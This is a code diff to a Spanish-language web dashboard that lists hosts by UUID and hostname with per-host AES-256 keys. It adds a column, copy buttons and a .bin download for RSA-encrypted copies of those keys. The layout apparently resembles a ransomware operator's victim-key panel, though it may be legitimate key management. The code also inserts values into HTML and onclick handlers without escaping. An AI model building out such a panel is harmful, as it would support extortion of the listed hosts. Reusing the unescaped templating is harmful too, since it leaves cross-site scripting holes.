@@ -238,6 +238,7 @@ function renderKeysTable(data) {
           <th onclick="handleSort('uuid')" style="cursor:pointer;">UUID ${getSortIcon('uuid')}</th>
           <th onclick="handleSort('hostname')" style="cursor:pointer;">Hostname ${getSortIcon('hostname')}</th>
           <th onclick="handleSort('aes_key')" style="cursor:pointer;">Clave AES-256 ${getSortIcon('aes_key')}</th>
+          <th>Clave Cifrada (RSA)</th>
           <th onclick="handleSort('created_at')" style="cursor:pointer;">Fecha ${getSortIcon('created_at')}</th>
           <th>Acciones</th>
         </tr>
@@ -248,12 +249,29 @@ function renderKeysTable(data) {
             <td class="mono" title="${row.uuid || ''}">${truncate(row.uuid, 12)}</td>
             <td><strong>${row.hostname || '-'}</strong></td>
             <td class="mono" style="max-width:350px;">
-              <span title="${row.aes_key || ''}">${row.aes_key || '-'}</span>
+              <div style="display:flex; align-items:center; justify-content:space-between; gap:10px;">
+                <span style="overflow:hidden; text-overflow:ellipsis;">${row.aes_key || '-'}</span>
+              </div>
+            </td>
+            <td class="mono">
+              ${row.encrypted_aes_key ? `
+                <div style="display:flex; align-items:center; gap:8px;">
+                  <span title="${row.encrypted_aes_key}" style="color:var(--success); font-size:10px;">
+                    ${truncate(row.encrypted_aes_key, 15)}...
+                  </span>
+                  <button onclick="copyToClipboard('${row.encrypted_aes_key}')" class="copy-btn" title="Copiar Cifrada">
+                    <i class="ph ph-copy"></i>
+                  </button>
+                  <button onclick="downloadKey('${row.hostname}_encrypted.bin', '${row.encrypted_aes_key}')" class="copy-btn" title="Descargar .bin">
+                    <i class="ph ph-download-simple"></i>
+                  </button>
+                </div>
+              ` : '<span style="color:#dcdcdc; font-style:italic;">No cifrada</span>'}
             </td>
             <td>${formatDate(row.created_at)}</td>
             <td>
               <div class="action-buttons">
-                <button onclick="copyToClipboard('${row.aes_key}')" class="copy-btn" title="Copiar clave">
+                <button onclick="copyToClipboard('${row.aes_key}')" class="copy-btn" title="Copiar clave AES">
                   <i class="ph ph-copy"></i>
                 </button>
                 <button class="action-btn edit" onclick="alert('Editar no implementado')" title="Editar">
@@ -331,6 +349,27 @@ function formatPlatform(platform) {
   };
   return labels[platform] || platform;
 }
+
+function downloadKey(filename, b64Content) {
+  try {
+    const binaryString = window.atob(b64Content);
+    const bytes = new Uint8Array(binaryString.length);
+    for (let i = 0; i < binaryString.length; i++) {
+      bytes[i] = binaryString.charCodeAt(i);
+    }
+    const blob = new Blob([bytes], { type: "application/octet-stream" });
+    const link = document.createElement('a');
+    link.href = window.URL.createObjectURL(blob);
+    link.download = filename;
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+  } catch (e) {
+    console.error('Download error:', e);
+    alert('Error al descargar clave');
+  }
+}
+
 
 function truncate(str, len) {
   if (!str) return '-';
